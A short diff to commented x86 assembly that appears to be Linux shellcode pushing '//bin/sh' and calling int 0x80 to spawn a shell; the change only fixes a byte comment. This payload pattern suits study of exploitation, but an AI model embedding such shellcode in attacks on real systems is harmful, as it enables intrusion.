@@ -73,7 +73,7 @@ cdq			; this trick uses the cdq command, which extends the eax register into edx
                         ; (negative value of eax), which is not the case so it zeros out edx, this way we can save an extra byte
 mov ecx, edx		; zero out ecx
 push edx                ; push null
-push 0x68732f6e         ; hs/b
+push 0x68732f6e         ; hs/n
 push 0x69622f2f         ; ib//
 mov ebx,esp             ; save pointer
 int 0x80
